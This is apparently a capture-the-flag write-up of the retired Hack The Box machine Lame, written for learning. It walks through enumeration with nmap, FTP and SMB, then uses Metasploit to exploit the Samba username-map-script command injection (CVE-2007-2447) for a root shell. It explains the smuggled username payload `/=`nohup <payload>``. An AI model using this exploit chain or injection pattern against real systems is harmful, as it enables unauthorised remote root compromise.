# Lame — Hack The Box Write-up

## Disclaimer

This write-up documents my approach to solving the retired Hack The Box machine **Lame**.
The purpose of this document is to record the learning process and techniques used during the challenge.
No active Hack The Box machines are included in this write-up.

---

## Machine Information

| Field      | Value        |
| ---------- | ------------ |
| Platform   | Hack The Box |
| Machine    | Lame         |
| Difficulty | Easy         |
| Target IP  | 10.129.3.133 |
| OS         | Linux        |

---

# 1. Enumeration

## Nmap Scan

Initial reconnaissance was performed using Nmap.

```bash
nmap -Pn -sS -p- -sV -T4 10.129.3.133
```

### Result

```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4)
```

From the scan results the following services were identified:

* FTP (vsftpd 2.3.4)
* SSH
* Samba
* distccd

Since several outdated services are present, further enumeration was required.

---

# 2. FTP Enumeration

Anonymous login was tested first.

```bash
ftp 10.129.3.133
```

Login result:

```
Name: anonymous
Password: anonymous
230 Login successful
```

Directory listing:

```
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
```

Although anonymous login was allowed, no useful files were discovered.

---

# 3. SMB Enumeration

Next, SMB shares were enumerated.

```bash
smbclient -L 10.129.3.133
```

Anonymous login was successful.

Discovered shares:

```
print$
tmp
opt
IPC$
ADMIN$
```

Accessing the `tmp` share:

```bash
smbclient //10.129.3.133/tmp -N
```

Listing files:

```
.ICE-unix
vmware-root
.X11-unix
5767.jsvc_up
.X0-lock
vgauthsvclog.txt.0
```

However, none of these files provided useful information.

During enumeration the Samba version was identified as:

```
Samba 3.0.20-Debian
```

Since this version is very old, a vulnerability search was performed.

---

# 4. Vulnerability Identification

Searching for known vulnerabilities:

```bash
searchsploit samba 3.0.20
```

Relevant result:

```
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution
```

This corresponds to the vulnerability **CVE-2007-2447**.

This vulnerability allows **remote command execution without authentication** when the `username map script` feature is enabled.

---

# 5. Exploitation

The exploit is available in Metasploit.

Start Metasploit:

```bash
msfconsole
```

Load the exploit module:

```bash
use exploit/multi/samba/usermap_script
set RHOSTS 10.129.3.133
run
```

Result:

```
[*] Started reverse TCP handler
[*] Command shell session opened
```

Verify shell access:

```bash
whoami
root
```

Root access was successfully obtained.

---

# 6. Vulnerability Analysis

During SMB authentication the request is processed in the following order:

```
SMB Session Setup Request
↓
Extract username
↓
Execute username map script
↓
Authentication
```

In vulnerable versions of Samba, the username is passed directly to a shell command.

Example:

```
sh -c "/etc/samba/usermap.sh <username>"
```

Because the username is executed within a shell command, shell metacharacters can lead to **command injection**.

The Metasploit exploit sends a specially crafted username:

```
/=`nohup <payload>`
```

Structure of the payload:

```
/=        → dummy prefix to bypass username validation
`payload` → command substitution executed by the shell
nohup     → prevents termination if the parent process exits
```

When processed by the shell:

```
sh -c "/etc/samba/usermap.sh /=`nohup <payload>`"
```

The payload executes before the script continues, resulting in a reverse shell.

---

# 7. Root Access

Once the exploit is executed, a command shell is obtained.

```
whoami
root
id
uid=0(root)
```

The Samba service runs with root privileges, which allows full system compromise.

---

# 8. Conclusion

The **Lame** machine was compromised by exploiting **CVE-2007-2447**, a command injection vulnerability in the Samba `username map script` feature.

Key points:

* Outdated Samba version (3.0.20)
* Command injection through the username field
* Remote command execution without authentication
* Root shell obtained through Metasploit exploit

This machine demonstrates the importance of proper input validation and the risks of executing user input within shell commands.
